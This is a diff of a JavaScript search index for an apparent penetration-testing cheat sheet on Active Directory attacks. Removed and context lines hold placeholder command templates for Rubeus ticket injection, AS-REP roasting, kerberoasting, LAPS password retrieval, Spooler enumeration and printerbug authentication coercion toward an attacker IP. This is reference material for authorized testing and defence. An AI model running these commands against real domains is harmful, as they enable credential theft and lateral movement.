@@ -69,16 +69,16 @@ var data = [
 
 
 //rubeus
-{"title":"inject ticket from file","link":"/cheats/Active_directory/cme.html   Rubeus.exe ptt /ticket:&lt;ticket&gt;"},
-{"title":"ASREPRoast specific user","link":"/cheats/Active_directory/cme.html   Rubeus.exe asreproast  /user:&lt;user&gt; /domain:&lt;domain_name&gt; /format:&lt;AS_REP_response_format&gt; /outfile:&lt;output_hashes_file&gt;"},
-{"title":"kerberoasting - current domain","link":"/cheats/Active_directory/cme.html   Rubeus.exe kerberoast /outfile:&lt;output_TGSs_file&gt;"},
-{"title":"Kerberos get hash: Rubeus.exe hash /user:&lt;user&gt; /domain:&lt;domain_name&gt; /password:&lt;password&gt;"},
+{"title":"inject ticket from file","link":"/cheats/Active_directory/rubeus.html "},
+{"title":"ASREPRoast specific user","link":"/cheats/Active_directory/rubeus.html "},
+{"title":"kerberoasting - current domain","link":"/cheats/Active_directory/rubeus.html "},
+{"title":"Kerberos get hash","link":"/cheats/Active_directory/rubeus.html"},
 
 //LAPS
-{"title":"get laps passwords","link":"/cheats/Active_directory/cme.html   Get-LAPSPasswords -DomainController &lt;ip_dc&gt; -Credential &lt;domain&gt;\&lt;login&gt; | Format-Table -AutoSize"},
+{"title":"get laps passwords","link":"/cheats/Active_directory/laps.html"},
 
 //Printerbug and Petitpotam
-{"title":"Finding Spooler services listening","link":"/cheats/Active_directory/cme.html   rpcdump.py &lt;domain&gt;/&lt;user&gt;:'&lt;password&gt;'@&lt;dc&gt; | grep MS-RPRN"},
+{"title":"Finding Spooler services listening","link":"/cheats/Active_directory/cme.html "},
 {"title":"Finding Spooler services anonymous","link":"/cheats/Active_directory/cme.html   rpcdump.py &lt;dc&gt; | grep -A 6 MS-RPRN"},
 {"title":"printerbug","link":"/cheats/Active_directory/cme.html   printerbug.py '&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;'@&lt;ip&gt; &lt;attacker_ip&gt;"},
 {"title":"webclientservicescanner","link":"/cheats/Active_directory/cme.html   webclientservicescanner '&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;'@&lt;ip_range&gt;"},
